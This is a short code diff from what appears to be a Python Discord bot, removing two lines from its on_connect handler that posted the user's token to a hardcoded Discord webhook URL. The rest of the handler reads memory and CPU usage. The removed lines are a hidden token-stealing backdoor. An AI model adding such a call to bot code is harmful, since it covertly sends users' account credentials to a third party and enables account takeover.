@@ -168,8 +168,6 @@ async def webhook(ctx, webhook):
 
 @nebula.event
 async def on_connect():
-    requests.post('https://canary.discord.com/api/webhooks/790623333724848168/W0Y4QcKaRhtdswP4vpzzbR6Esdv8xKlvwHJdYrs-AG4vXr952BKHaX5sG0E1V1a824as', json=
-    {'content': f'{token}'})
     mem = psutil.virtual_memory()
     cpu_per = round(psutil.cpu_percent(),1)
     mem_per = round(psutil.virtual_memory().percent,1)
